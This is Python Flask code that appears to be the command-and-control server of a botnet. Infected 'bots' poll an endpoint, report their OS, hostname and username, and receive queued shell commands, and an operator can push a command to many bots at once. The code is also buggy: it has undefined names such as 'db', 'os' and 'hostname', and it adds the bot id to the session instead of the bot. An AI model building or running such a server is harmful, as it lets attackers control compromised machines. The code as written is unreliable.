from flask import Blueprint, request, abort, current_app, url_for, send_file, render_template, flash, redirect, escape
from datetime import datetime
from models import Bot
from models import Command

api = Blueprint('api', __name__)



@api.route('/mass_exec', methods=['POST'])
def mass_exec():
	selection = request.form.getlist('selection')
	if 'exec' in request.form:
		for bot_id in selection:
			Bot.query.get(bot_id).push(request.form['cmd'])
	return redirect(url_for('ui.bot_list'))


@api.route('/<bot_id>/push')
def push(bot_id):
	bot = Bot.query.get(bot_id)
	if not bot:
		abort(404)
	bot.push(request.form['cmd'])
	return ''	
#API call to check status of a bot
@api.route('/<bot_id>/status', methods=['post'])
def get_status(bot_id):
	bot = Bot.query.get(bot_id)			#set bot equal to var
	if not bot:							#if doesnt exist then create new bot obj and add to db
		bot = Bot(bot_id)				
		db.session.add(bot_id)
		db.session.commit()
	info = request.json					#api call by post with json obj, update the db with the json obj
	if info:
		if 'os' in info:
			bot.os = os
		if 'hostname' in info:
			bot.hostname = hostname
		if 'username' in info:
			bot.username
	bot.ip = request.remote_addr		#update ip address and last ping to now
	bot.last_ping = datetime.now()
	pending_cmd = ''					#check if the bot has any commands pending, if so then delete it and return it
	cmd = bot.commands.order_by(Command.timestamp.desc()).first()
	if cmd:
		pending_cmd = cmd.cmdline
		db.session.delete(cmd)
		db.session.commit()
	return pending_cmd
